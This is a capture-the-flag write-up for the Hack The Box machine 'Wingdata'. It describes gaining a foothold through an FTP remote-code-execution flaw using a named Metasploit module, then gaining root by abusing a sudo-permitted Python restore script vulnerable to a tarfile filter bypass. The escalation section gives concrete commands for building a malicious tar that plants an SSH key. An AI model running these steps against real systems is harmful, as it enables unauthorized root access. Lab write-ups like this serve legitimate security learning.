# Summary 
Wingdata is an easy Linux machine on Hack The Box that focuses on service exploitation and privilege escalation.

Initial access is obtained by exploiting a vulnerable FTP service affected by CVE-2025-47812, which allows remote code execution (RCE). This vulnerability provides a foothold on the system as the wftserver user.

During post-exploitation enumeration, a user directory containing multiple XML files is discovered, each storing hashed credentials. By cracking these hashes, valid user credentials are recovered, enabling SSH access to the machine.

Further enumeration reveals that the compromised user has NOPASSWD sudo privileges to execute a Python script. This script is vulnerable to CVE-2025-4138 and CVE-2025-4517, which can be leveraged to escalate privileges and gain root access.

## Initial Access
After checking the Web Server I found another domain ftp.wingdata.htb that lead to FTP server but we need first to add the domain to /etc/hosts.

![FTP server](/assets/img/FTP.png)

We can notice the FTP server version in this page after some research with searchsploit we found out that this FTP server is vulnurable to CVE-2025-47812, which allows remote code execution (RCE).   
To streamline the exploitation process, the Metasploit Framework was utilized to search for an automated module. The search identified a highly rated (‘excellent’) exploit: exploit/multi/http/wingftp_null_byte_rce. ## Privilege Escalation

Enumerating sudo privileges revealed a Python script that the user can execute as root with NOPASSWD, making it a potential privilege escalation vector.

``` shell
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
``` 

After so digging i found taht the code is vulnurable to CVE-2025-4138 / CVE-2025-4517  Python tarfile Filter Bypass via PATH_MAX so i followed the instruction in this Repo [Link](https://github.com/DesertDemons/CVE-2025-4138-4517-POC/tree/main) to exploit this vulnurability 
this part is the vulnurable part :
```python
  try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)
```

## Root Flag
Finally, by following the provided instructions, I was able to connect to the system via SSH as the root user.
``` shell
# 1. Generate an SSH key pair (REQUIRED — must exist before creating tar)
wacky@wingdata:~$ ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
# 2. Create the malicious tar archive
wacky@wingdata:~$ python3 exploit.py --preset ssh-key --payload ~/.ssh/wingdata_key.pub --tar-out backup_1.tar
# 3. Move the tar and trigger privileged extraction
wacky@wingdata:~$ mv backup_1.tar /opt/backup_clients/backups/
wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1.tar -r restore_wingdata1
# 4. SSH in as root (use the SAME key you generated in step 1)
wacky@wingdata:~$ ssh -i ~/.ssh/wingdata_key root@10.129.20.22
root@wingdata:~# ls
root.txt 
```

# Conclusion
This machine demonstrates:

- Exploiting exposed services (FTP RCE)
- Credential harvesting from misconfigured storage
- Hash cracking with weak salt usage
- Privilege escalation via insecure file extraction

# Key Takeaways

- Always check for **misconfigured services**
- Look for **credential leaks in config files**
- Weak salting = easy cracking
- Python `tarfile` is dangerous if improperly used
